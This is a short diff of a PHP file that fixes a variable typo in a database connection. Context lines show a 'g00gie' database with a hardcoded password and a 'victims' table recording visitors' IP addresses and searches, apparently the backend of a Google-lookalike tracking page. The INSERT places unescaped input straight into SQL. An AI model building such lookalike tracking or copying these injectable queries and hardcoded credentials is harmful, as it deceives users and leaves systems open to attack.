@@ -14,7 +14,7 @@ $pass = "Password01";
 $dbn = "g00gie";
 ?>
 <?php
-$conn = mysqli_connect($svrnm, $sur, $pass, $dbn);
+$conn = mysqli_connect($svrnm, $usr, $pass, $dbn);
 $sql = "SELECT ipaddr, search from victims;";
 $sql_ins = "INSERT into victims (ipaddr,search) values ('$ipadd','$search')";
 ?>
